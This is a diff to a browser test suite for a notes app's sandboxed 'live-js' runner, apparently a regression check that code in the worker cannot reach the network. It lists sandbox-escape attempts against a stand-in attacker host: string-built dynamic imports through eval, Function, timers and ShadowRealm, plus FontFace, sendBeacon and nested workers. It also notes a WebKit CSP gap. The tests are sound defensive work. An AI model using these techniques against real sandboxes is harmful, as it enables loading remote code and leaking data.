@@ -83,7 +83,7 @@ async function writeNote(page: Page, markdown: string) {
 
 const preview = (page: Page) => page.locator(".prose-lumen").first();
 
-test("live-js has no network: every way out fails in the worker, nothing is requested", async ({ page, browserName }) => {
+test("live-js has no network: every way out fails in the worker, nothing is requested", async ({ page }) => {
   const traffic = await watchFakeHosts(page);
   await page.goto("/");
   const attempts = {
@@ -92,10 +92,17 @@ test("live-js has no network: every way out fails in the worker, nothing is requ
     websocket: `new WebSocket("wss://${EVIL}/ws")`,
     eventsource: `new EventSource("https://${EVIL}/sse")`,
     importScripts: `importScripts("https://${EVIL}/classic.js")`,
-    dynamicImport: `import("https://${EVIL}/module.js")`,
+    // A literal import() makes the worker refuse the whole run (next test),
+    // so these build one from a string: every string compiler is gone.
+    evalImport: `(0, eval)("imp" + "ort('https://${EVIL}/eval.js')")`,
+    functionImport: `Function("return imp" + "ort('https://${EVIL}/function.js')")()`,
+    asyncCtorImport: `(async () => {}).constructor("return imp" + "ort('https://${EVIL}/async.js')")()`,
+    timerImport: `setTimeout("imp" + "ort('https://${EVIL}/timer.js')")`,
+    fontFace: `new FontFace("x", "url(https://${EVIL}/font.woff2)").load()`,
+    shadowRealm: `new ShadowRealm().evaluate("imp" + "ort('https://${EVIL}/realm.js')")`,
     beacon: `navigator.sendBeacon("https://${EVIL}/beacon", "x")`,
     nestedWorker: `new Worker("https://${EVIL}/worker.js")`,
-    globalFetch: `(0, eval)("this").fetch("https://${EVIL}/global")`,
+    globalFetch: `globalThis.fetch("https://${EVIL}/global")`,
     protoFetch: `Object.getPrototypeOf(self).fetch.call(self, "https://${EVIL}/proto")`,
   };
   // Entries, not `results.fetch = …`: the worker's lockdown defines
@@ -118,16 +125,26 @@ test("live-js has no network: every way out fails in the worker, nothing is requ
   const results = JSON.parse(line!.slice(line!.indexOf("{"))) as Record<string, string>;
   expect(Object.keys(results).sort()).toEqual(Object.keys(attempts).sort());
   for (const [name, outcome] of Object.entries(results)) expect(outcome, name).toBe("blocked");
-  // fetch, XHR, WebSocket, … are gone from the worker; the one load that is
-  // still attempted (a dynamic import) is refused by the runner's CSP in
-  // Chromium and Firefox. KNOWN GAP in WebKit (docs/security/headers.md,
-  // open item 11): the import reaches the network, apparently because the
-  // runner's CSP does not apply to its blob: worker. Pinned exactly, so
-  // anything else leaking, or WebKit closing the gap, fails this test.
-  const leaked = browserName === "webkit" ? [`https://${EVIL}/module.js`] : [];
-  expect(traffic.left()).toEqual(leaked);
+  // Nothing reached the network, in any engine.
+  expect(traffic.left()).toEqual([]);
   // The runner is a sandboxed frame without same-origin powers.
   await expect(page.locator("iframe[data-livejs-runner]").first()).toHaveAttribute("sandbox", "allow-scripts");
+});
+
+test("live-js refuses code with import(): the run fails before it starts, nothing is requested", async ({ page }) => {
+  // WebKit does not apply the runner's script-src to a worker's dynamic
+  // import() (docs/security/headers.md, open item 11), so the worker never
+  // compiles code that contains the word.
+  const traffic = await watchFakeHosts(page);
+  await page.goto("/");
+  await writeNote(page, "```live-js\nconsole.log(\"before\");\nawait import(\"https://" + EVIL + "/module.js\");\n```\n");
+  await expect(page.locator("text=JS run: Not run yet")).toBeVisible({ timeout: 10_000 });
+  await page.getByRole("button", { name: "Run", exact: true }).first().click();
+  await expect(page.locator("text=JS run: Runtime error")).toBeVisible({ timeout: 10_000 });
+  await expect(page.locator('text=/contains the word "import"/').first()).toBeVisible();
+  // Refused before compiling: not even the line before the import ran.
+  await expect(page.locator("text=/\\[log\\] before/")).toHaveCount(0);
+  expect(traffic.left()).toEqual([]);
 });
 
 test("raw HTML keeps only Lumen's own classes; styling cannot cover the app", async ({ page }) => {
